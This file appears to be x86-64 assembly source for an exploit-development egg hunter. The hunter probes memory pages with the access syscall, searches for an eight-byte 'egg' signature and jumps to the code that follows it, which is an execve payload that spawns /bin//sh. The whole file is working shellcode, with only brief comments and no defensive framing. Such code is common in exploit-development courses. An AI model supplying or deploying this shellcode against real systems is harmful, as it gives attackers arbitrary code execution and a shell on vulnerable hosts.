; Egg Hunter Code
;

global _start
section .text

_start:

        mov ebx, 0x50905090 ; Egg signature
        push rbx
        shl rbx, 32
        or rbx, [rsp]       ; Make RBX 5090509050905090
        xor rdx, rdx
        push rdx
        mov dh, 0x10        ; RDX = 0x1000 (PAGE_SIZE)
        pop rdi             ; RDI to 0
        push rdi
        pop rsi             ; RSI to 0

page_check:

        push 0x15           ; access syscall 21
        pop rax
        syscall
        cmp al, -14         ; Check for EFAULT
        jne short egg_chk_start
        add rdi, rdx
        jmp short page_check

egg_chk_start:

        push rdx
        pop rcx
        sub ecx, 8          ; 0xff8 loop count

egg_test:

        cmp rbx, [rdi]
        je short egg_found
        inc rdi
        loop egg_test
        add rdi, 8          ; Align to 4k for next test
        jmp short page_check

egg_found:

        jmp rdi

section .egg

    ;egg value to instructions 50 - push rax & 90 - NOP

        nop
        push rax
        nop
        push rax
        nop
        push rax
        nop
        push rax

    ; Execve payload

execve:
        xor rax, rax
        push rax

        mov rbx, 0x68732f2f6e69622f
        push rbx
        mov rdi, rsp

        push rax
        mov rdx, rsp
        push rdi

        mov rsi, rsp

        add rax, 59
        syscall
